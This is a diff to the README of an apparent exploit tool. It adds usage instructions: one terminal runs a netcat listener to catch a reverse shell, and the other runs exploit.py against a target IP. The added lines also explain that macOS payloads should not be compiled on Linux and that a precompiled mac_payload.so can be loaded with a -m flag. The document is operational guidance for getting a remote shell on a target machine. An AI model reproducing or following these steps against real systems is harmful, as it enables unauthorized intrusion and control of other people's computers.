@@ -31,7 +31,7 @@ However, if you want to use some newer version or another version of `impacket`,
 
 ## How to use
 
-To exploit target, you need open two terminals.
+To exploit target, you need open two terminals. One use `netcat` to interact with the reverse shell, the other is used to exploit the BUG.
 
 Usage:
 
@@ -41,6 +41,16 @@ $ nc -p 23333 -l
 
 # Second terminal to exploit target
 $ python3 ./exploit.py -lhost 192.168.71.136 --rhost 192.168.71.135
+```
+If the target is macOS, you **should not to** compile the module on Linux! As gcc do not support MACH-O format. If you are a mac user, macOS payload compilSation works.
+
+A precompiled version is in the directory. The `mac_payload.so`.
+
+Use `-m` flag to make `exploit.py` know you will use a customized payload.
+
+
+```shell
+python3 ./exploit.py -lhost 192.168.71.136 --rhost 192.168.71.135 -m mac_payload.so
 ```
 
 ## Uninstall
